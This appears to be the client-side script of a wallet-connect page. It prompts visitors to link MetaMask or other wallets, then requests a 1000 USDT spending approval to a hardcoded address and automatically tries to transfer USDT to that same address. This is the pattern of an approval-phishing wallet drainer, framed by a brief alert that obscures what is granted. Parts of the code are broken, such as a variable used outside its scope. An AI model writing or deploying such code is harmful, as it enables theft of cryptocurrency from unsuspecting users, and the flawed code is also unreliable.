let isConnecting = false;
const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT token contract address
const spenderAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Address allowed to spend tokens

async function connectWallet(wallet) {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return;
    }

    isConnecting = true;
    document.getElementById("connectButton").disabled = true;

    try {
        let provider;

        // Initialize the wallet provider based on user selection
        if (wallet === 'MetaMask') {
            // Connect to MetaMask
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            console.log(`Connected to MetaMask account: ${account}`);
        } else {
            // For WalletConnect
            provider = new WalletConnectProvider.default({
                infuraId: "YOUR_INFURA_ID", // Replace with your Infura ID if needed
            });

            await provider.enable();
            const accounts = await provider.request({ method: 'eth_accounts' });
            const account = accounts[0];
            console.log(`Connected to WalletConnect account: ${account}`);
        }
        
        // Notify user about dApp's permission request
        alert("You're granting permission to the dApp to manage your wallet and transfer tokens.");
        
        // Approve the dApp to spend tokens on behalf of the user
        await approveTokens(account);
        
    } catch (error) {
        console.error("Error connecting to wallet:", error);
    } finally {
        isConnecting = false;
        document.getElementById("connectButton").disabled = false;
    }
}

async function approveTokens(account) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    // ERC-20 Token Contract
    const tokenContract = new ethers.Contract(
        tokenAddress,
        [
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function allowance(address owner, address spender) public view returns (uint256)"
        ],
        signer
    );

    try {
        const amountToApprove = ethers.utils.parseUnits("1000", 6); // Approve 1000 USDT tokens

        // Approve the dApp to transfer tokens on behalf of the user
        const tx = await tokenContract.approve(spenderAddress, amountToApprove);
        console.log("Approval transaction sent:", tx.hash);
        document.getElementById("status").textContent = "Approval sent! Tx Hash: " + tx.hash;

        await tx.wait();
        console.log("Approval confirmed:", tx.hash);
        
        // Check the allowance to confirm it's set
        const allowance = await tokenContract.allowance(account, spenderAddress);
        console.log("Allowance granted:", ethers.utils.formatUnits(allowance, 6), "USDT");
        
        // Automatically proceed to transfer tokens
        if (allowance.gte(amountToApprove)) {
            await sendTokens(account);
        }
    } catch (error) {
        console.error("Error during approval:", error);
        document.getElementById("status").textContent = "Approval failed: " + error.message;
    }
}

async function sendTokens(account) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    const tokenContract = new ethers.Contract(
        tokenAddress,
        [
            "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
        ],
        signer
    );

    const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Replace with your recipient address
    const amountInWei = ethers.utils.parseUnits("10", 6); // 10 USDT

    try {
        const tx = await tokenContract.transferFrom(account, recipientAddress, amountInWei);
        console.log("Tokens sent:", tx.hash);
        document.getElementById("status").textContent = "Tokens sent! Tx Hash: " + tx.hash;

        await tx.wait();
        console.log("Transaction confirmed:", tx.hash);
    } catch (error) {
        console.error("Error sending tokens:", error);
        document.getElementById("status").textContent = "Transaction failed: " + error.message;
    }
}

// Modal functionality
document.getElementById("connectButton").addEventListener("click", function() {
    document.getElementById("walletModal").classList.add("show");
});

// Close modal functionality
document.getElementById("closeModal").addEventListener("click", function() {
    document.getElementById("walletModal").classList.remove("show");
});

// Wallet button click handlers
document.getElementById("metamaskButton").addEventListener("click", () => {
    connectWallet('MetaMask');
    document.getElementById("walletModal").classList.remove("show");
});

document.getElementById("trustWalletButton").addEventListener("click", () => {
    connectWallet('Trust Wallet');
    document.getElementById("walletModal").classList.remove("show");
});

document.getElementById("rainbowWalletButton").addEventListener("click", () => {
    connectWallet('Rainbow Wallet');
    document.getElementById("walletModal").classList.remove("show");
});

document.getElementById("argentWalletButton").addEventListener("click", () => {
    connectWallet('Argent Wallet');
    document.getElementById("walletModal").classList.remove("show");
});

document.getElementById("coinbaseWalletButton").addEventListener("click", () => {
    connectWallet('Coinbase Wallet');
    document.getElementById("walletModal").classList.remove("show");
});

document.getElementById("oneInchWalletButton").addEventListener("click", () => {
    connectWallet('1inch Wallet');
    document.getElementById("walletModal").classList.remove("show");
});
